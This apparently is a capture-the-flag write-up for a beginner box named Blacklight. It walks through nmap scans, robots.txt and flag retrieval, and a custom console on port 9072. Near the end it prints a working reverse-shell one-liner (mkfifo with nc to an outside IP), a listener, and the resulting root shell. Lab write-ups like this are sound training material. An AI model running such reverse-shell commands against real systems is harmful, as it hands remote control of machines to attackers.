@@ -1,0 +1,195 @@
+#+TITLE: WriteUp Blcklight Cyberrages
+#+AUTHOR: Redacted
+
+* Enumeration
+We start the work with a simple ~Host scan~ to understand if the hosts is up.
+#+begin_src bash
+sudo nmap -sn  192.168.125.150
+#+end_src
+
+_Output_:
+#+begin_src text
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 09:10 EST
+Nmap scan report for 192.168.125.150
+Host is up (0.042s latency).
+Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
+#+end_src
+
+#+begin_export bash
+sudo nmap 192.168.125.150 -O -T4
+#+end_export
+
+_Output_:
+#+begin_src bash
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 09:12 EST
+Nmap scan report for 192.168.125.150
+Host is up (0.094s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=2/23%OT=80%CT=1%CU=36568%PV=Y%DS=3%DC=I%G=Y%TM=65D8
+OS:A7CC%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)
+OS:OPS(O1=M557ST11NW6%O2=M557ST11NW6%O3=M557NNT11NW6%O4=M557ST11NW6%O5=M557
+OS:ST11NW6%O6=M557ST11)WIN(W1=6D38%W2=6D38%W3=6D38%W4=6D38%W5=6D38%W6=6D38)
+OS:ECN(R=Y%DF=Y%T=40%W=6E28%O=M557NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
+OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
+OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
+OS:Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
+OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 3 hops
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds
+#+end_src
+
+The host is _up_ and we have just find one port, the 80 HTTP.
+Now we need to find more informations about the host lisks which port are opens.
+So let'continue the enumertion with full TCP ports scan.
+#+begin_src bash
+nmap -sC -sV 192.168.125.150 -p- --reason 
+#+end_src
+
+_Output_:
+#+begin_src bash
+<SNIP>
+PORT     STATE SERVICE REASON  VERSION
+80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: BLACKLIGHT
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+9072/tcp open  unknown syn-ack
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+|_    BLACKLIGHT console mk1. Type .help for instructions
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+<SNIP
+#+end_src
+
+We have finds some intersting informetions about the hosts.
+It has two open ports:
+~80 HTTP~ running an Apache https with 2.4.29 versions.
+~9072 unknown~, it isn't a standard port, from the nmap maybe some interaction protocol via terminal.
+* Footprinting
+** 80 http
+We start by looking for a connection to the web server.
+[[./pics/web.png]]
+
+Except for some information about the other the only good stuff is a phrese that say that: "_You are already close to the first flag. The web is the way._"
+before enumerating with arrogance let’s try some classical things.
+#+begin_src bash
+curl -X GET 192.168.125.150/robots.txt
+#+end_src
+_Output_:
+#+begin_src text
+User-agent: *
+flag1.txt
+blacklight.dict
+#+end_src
+
+Okey, simple, the first flag is taken.
+#+begin_src bash
+curl -X GET 192.168.125.150/flag1.txt
+#+end_src
+_Output_:
+#+begin_src text
+{flag1:<redacted>}
+
+9072. The secret is at home.
+#+end_src
+And other hint!
+
+Another interrupting thing made available by the web server is a dict, let’s take it.
+#+begin_src bash
+wget 192.168.125.150/blacklight.dict
+#+end_src
+
+#+begin_src bash
+wc -l blacklight.dict 
+#+end_src
+_Output_:
+#+begin_src text
+398 blacklight.dict
+#+end_src
+We have in hand a list with 398 entries.
+
+** 9072 unknown
+Let's check more carefully the port 9072 for try to find other stuff.
+We dosen't know what's behind the port, but nmap output has give to us an interesting string.
+#+begin_src text
+  BLACKLIGHT console mk1. Type .help for instructions	
+#+end_src
+It's look likes an interaction via terminal whit the service, there's nothing left to try.
+#+begin_src bash
+nc 192.168.125.150 9072
+#+end_src
+
+_Output_:
+#+begin_src text
+BLACKLIGHT console mk1. Type .help for instructions
+#+end_src
+
+As we expected the connection was established and is waiting for our input.
+we will immediately enter ~.help~ to understand what we are offered.
+
+#+begin_src text
+BLACKLIGHT console mk1. Type .help for instructions
+.help 
+.readhash - Get one step closer
+.exec <cmd> - Execute commands
+.quit - Exit the server
+.exec ls
+You have one more command until the server shuts down. Choose wisely!
+#+end_src
+
+We are offered three comands, ~.readhash~, ~.exec~, ~.quit~, the ~.exec~ immediately attracts attention but trying we realize that it runs a specific command that we do not know and also gives us a last attempt to try, what will happen next?
+It’s not worth it, the hash command looks interrupting, let’s try it
+#+begin_src text
+.readhash
+b5f4723bd6df85b54b0905bd6d734be9ef1cc1eb977413a932a828b5c52ef5a6
+Bye!
+#+end_src
+
+We have just found aa ~hash~, this is very important, let's save it for later.
+#+begin_src bash
+echo 'b5f4723bd6df85b54b0905bd6d734be9ef1cc1eb977413a932a828b5c52ef5a6' > hash.unknown
+#+end_src
+
+Really interesting the behavior of the service, once closed the connection will also be closed the port, we did well not to dare with . exec.
+#+begin_src bash
+nmap -sC 192.168.125.150 -p 9072   
+#+end_src
+
+_Output_:
+#+begin_src text
+Nmap scan report for 192.168.125.150
+Host is up (0.047s latency).
+
+PORT     STATE  SERVICE
+9072/tcp closed unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
+#+end_src
+
+Being curious to understand thoroughly I decided to restart the car and try a second way.
+create a payload for a reverse shell.
+#+begin_src 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.3.177.13 4444 >/tmp/f
+#+end_src
+
+_Start Listener_
+#+begin_src bash
+nc -nlvp 4444
+#+end_src
+
+_Output_:
+#+begin_src text
+  192.168.125.150: inverse host lookup failed: Unknown host
+  connect to [192.168.125.150] from (UNKNOWN) [192.168.125.150] 57228
+  /bin/sh: 0: can't access tty; job control turned off
+  # whoami
+  root
+#+end_src
+
+Blacklight is a very easy challenge. It is only suitable for absolute beginners. I wish if the author had integrated some exploitation scenarios or privilege escalation vectors to the box.
